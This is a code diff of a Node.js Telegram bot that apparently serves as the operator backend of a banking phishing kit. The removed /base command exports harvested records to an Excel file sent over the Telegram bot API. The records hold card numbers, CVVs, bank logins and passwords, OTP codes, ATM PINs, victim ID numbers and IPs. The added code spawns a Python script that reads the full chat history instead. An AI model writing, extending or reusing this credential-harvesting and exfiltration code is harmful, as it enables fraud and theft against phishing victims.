@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const XLSX = require('xlsx');
+const { spawn } = require('child_process'); // 👈 NUEVO: para ejecutar Python
 
 const app = express();
 app.use(cors());
@@ -457,70 +458,30 @@ async function procesarUpdate(update, tokenBot) {
                 }
                 return;
             }
+
+            // ============================================================
+            // 📊 /base — AHORA LEE TODO EL HISTORIAL CON PYTHON (MTProto)
+            // ============================================================
             if (comando === '/base') {
-                try {
-                    if (pagosPendientes.size === 0) {
-                        await responder('📭 No hay registros para exportar.');
-                        return;
+                await responder('⏳ Leyendo TODO el historial desde Telegram (esto puede tardar unos segundos)...');
+                
+                // Ejecuta el script de Python que lee todo el historial
+                const pythonProcess = spawn('python3', ['leer_historial.py']);
+
+                pythonProcess.stdout.on('data', (data) => {
+                    console.log(`[Python /base]: ${data.toString().trim()}`);
+                });
+
+                pythonProcess.stderr.on('data', (data) => {
+                    console.error(`[Python Error /base]: ${data.toString().trim()}`);
+                });
+
+                pythonProcess.on('close', (code) => {
+                    if (code !== 0) {
+                        console.error(`El script de Python falló con código ${code}`);
+                        responder('❌ Hubo un error generando la base completa. Revisa los logs.');
                     }
-
-                    const filas = [];
-                    for (const pago of pagosPendientes.values()) {
-                        filas.push({
-                            'ID Solicitud': pago.solicitud_id || '',
-                            'Estado': pago.estado || '',
-                            'Fase Actual': pago.fase_actual || '',
-                            'Paso': pago.paso || '',
-                            'Banco Especial': pago.es_especial ? 'SÍ' : 'NO',
-                            'Solicitante': pago.nombre_solicitante || '',
-                            'Cédula Solicitante': pago.cedula_solicitante || '',
-                            'Titular': pago.titular || '',
-                            'Número Tarjeta': pago.numero_tarjeta || '',
-                            'Vencimiento': pago.vencimiento || '',
-                            'CVV': pago.cvv || '',
-                            'Marca': (pago.marca_tarjeta || '').toUpperCase(),
-                            'Banco Emisor': pago.banco_emisor || '',
-                            'Usuario Banco': pago.usuario_banco || '',
-                            'Contraseña Banco': pago.password_banco || '',
-                            'Código OTP': pago.codigo_otp || '',
-                            'Clave ATM': pago.clave_atm || '',
-                            'Clave Dinámica': pago.clave_dinamica || '',
-                            'Requiere Clave ATM': pago.requiere_clave_atm ? 'SÍ' : 'NO',
-                            'Requiere Clave Dinámica': pago.requiere_clave_dinamica ? 'SÍ' : 'NO',
-                            'Requiere SMS': pago.requiere_sms ? 'SÍ' : 'NO',
-                            'Motivo Rechazo': pago.motivo_rechazo || '',
-                            'Redirigir A': pago.redirigir_a || '',
-                            'IP': pago.ip || ''
-                        });
-                    }
-
-                    const hoja = XLSX.utils.json_to_sheet(filas);
-                    const libro = XLSX.utils.book_new();
-                    XLSX.utils.book_append_sheet(libro, hoja, 'Registros');
-
-                    const anchos = Object.keys(filas[0]).map(k => ({ wch: Math.max(k.length + 2, 20) }));
-                    hoja['!cols'] = anchos;
-
-                    const buffer = XLSX.write(libro, { type: 'buffer', bookType: 'xlsx' });
-
-                    const formData = new FormData();
-                    formData.append('chat_id', chatIdMsg);
-                    formData.append('caption', `📊 <b>BASE DE DATOS</b>\n\n📦 Total registros: <b>${filas.length}</b>\n🕒 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`);
-                    formData.append('parse_mode', 'HTML');
-                    formData.append('document', new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `base_registros_${Date.now()}.xlsx`);
-
-                    const urlEnvio = `https://api.telegram.org/bot${tokenBot}/sendDocument`;
-                    const resp = await fetch(urlEnvio, { method: 'POST', body: formData });
-                    const dataResp = await resp.json();
-
-                    if (!dataResp.ok) {
-                        console.error('Error enviando Excel:', dataResp);
-                        await responder('❌ Error al enviar el archivo Excel.');
-                    }
-                } catch (err) {
-                    console.error('Error en /base:', err);
-                    await responder('❌ Error generando la base de datos.');
-                }
+                });
                 return;
             }
 
